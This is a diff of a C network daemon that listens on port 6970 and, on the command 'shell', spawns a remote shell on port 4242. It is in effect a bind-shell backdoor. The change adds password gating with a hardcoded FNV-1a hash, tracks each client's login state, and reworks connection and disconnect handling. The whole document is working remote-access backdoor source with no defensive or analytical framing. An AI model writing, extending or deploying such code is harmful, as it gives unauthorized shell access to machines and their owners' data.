@@ -13,10 +13,38 @@
 #define DEBUG printf
 #define MAX_CLIENTS 3
 #define PORT 6970
+#define HASHED_PASSWORD 1340397520672655617UL
+
+#define FNV_OFFSET 14695981039346656037UL
+#define FNV_PRIME 1099511628211UL
 
 #define HELP							\
 "?		show help\n"					\
 "shell	spawn remote shell on 4242\n"
+
+typedef enum {
+	CLI,
+	PASSWORD,
+	SHELL
+} State;
+
+typedef struct {
+	int fd;
+	bool logged;
+} Client;
+
+void add_client(Client *clients, int fd);
+
+// Return 64-bit FNV-1a hash for a given password. See:
+// https://en.wikipedia.org/wiki/Fowler–Noll–Vo_hash_function
+static uint64_t fnv1a(const char* key) {
+    uint64_t hash = FNV_OFFSET;
+    for (const char* p = key; *p; p++) {
+        hash ^= (uint64_t)(unsigned char)(*p);
+        hash *= FNV_PRIME;
+    }
+    return hash;
+}
 
 char *clean_join(char *s1, char *s2) {
 	char *tmp = ft_strjoin(s1, s2);
@@ -47,31 +75,34 @@ int init_socket(struct sockaddr_in *addr) {
 	return sock;
 }
 
-bool new_connection(
+int new_connection(
 	int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev) {
 	socklen_t len = sizeof(struct sockaddr);
-	int conn = accept(sock, (struct sockaddr*)addr, &len);
-	if (conn < 0) {
+	int fd = accept(sock, (struct sockaddr*)addr, &len);
+	if (fd < 0) {
 		DEBUG("accept does not work");
-		return false;
+		return -1;
 	}
 
-	printf("New connection !\n");
-	ev->events = EPOLLIN;
-	ev->data.fd = conn;
-	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn, ev) < 0) {
+	ev->events = EPOLLIN|EPOLLRDHUP;
+	ev->data.fd = fd;
+	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, ev) < 0) {
 		DEBUG("epoll_ctl does not work");
-		return false;
+		return -1;
 	}
 
-	return true;
+	DEBUG("New connection !\n");
+	return fd;
 }
 
-void disconnect_client(int fd, int epollfd, struct epoll_event *ev) {
-	printf("Client disconnected !\n");
-	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, fd, ev) < 0)
+void disconnect_client(Client *client, int epollfd, struct epoll_event *ev) {
+	DEBUG("Client disconnected !\n");
+	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, client->fd, ev) < 0)
 		DEBUG("epoll_ctl does not work");
-	close(fd);
+	close(client->fd);
+
+	client->fd = -1;
+	client->logged = false;
 }
 
 char *readline(int fd) {
@@ -99,7 +130,7 @@ char *readline(int fd) {
 }
 
 void putstr(int fd, char *s) {
-	send(fd, s, ft_strlen(s), 0);
+	send(fd, s, ft_strlen(s), MSG_NOSIGNAL);
 }
 
 bool sh(int fd) {
@@ -115,12 +146,45 @@ bool sh(int fd) {
 	return true;
 }
 
+void init_clients(Client *clients) {
+	for (int i = 0; i < MAX_CLIENTS; i++) {
+		clients[i].fd = -1;
+	}
+}
+
+void add_client(Client *clients, int fd) {
+	for (int i = 0; i < MAX_CLIENTS; i++) {
+		if (clients[i].fd == -1) {
+			clients[i].fd = fd;
+			return;
+		}
+	}
+}
+
+Client *get_client(Client *clients, int fd) {
+	for (int i = 0; i < MAX_CLIENTS; i++) {
+		if (clients[i].fd == fd)
+			return clients+i;
+	}
+	return NULL;
+}
+
+void check_password(Client *client, char *line) {
+	if (fnv1a(line) == HASHED_PASSWORD) {
+		client->logged = true;
+	} else {
+		putstr(client->fd, "Password: ");
+	}
+}
+
 int main() {
 	struct sockaddr_in addr = {};
 	struct epoll_event ev, events[MAX_CLIENTS];
+	Client clients[MAX_CLIENTS] = {};
 
 	bool shell = false;
 
+	init_clients(clients);
 	int sock = init_socket(&addr);
 	if (!sock)
 		return 0;
@@ -149,25 +213,28 @@ int main() {
 		for (int n = 0; n < nfds; n++) {
 			int fd = events[n].data.fd;
 			if (fd == sock) {
-				new_connection(sock, epollfd, &addr, &ev);
-
-				if (shell) {
-					shell = false;
-					sh(fd);
-				}
+				int newfd = new_connection(sock, epollfd, &addr, &ev);
+				add_client(clients, newfd);
+				putstr(newfd, "Password: ");
 			} else {
-				char *line = readline(fd);
+				Client *client = get_client(clients, events[n].data.fd);
+				if (!client) {
+					continue;
+				}
+				char *line = readline(client->fd);
 
 				if (!line) {
-					disconnect_client(fd, epollfd, &ev);
+					disconnect_client(client, epollfd, &ev);
 					continue;
 				}
 
-				if (!ft_strcmp(line, "shell\n")) {
+				if (!client->logged) {
+					check_password(client, line);
+				} else if (!ft_strcmp(line, "shell\n")) {
 					shell = true;
-					disconnect_client(fd, epollfd, &ev);
+					disconnect_client(client, epollfd, &ev);
 				} else if (!ft_strcmp(line, "?\n")) {
-					putstr(fd, HELP);
+					putstr(client->fd, HELP);
 				}
 			}
 		}
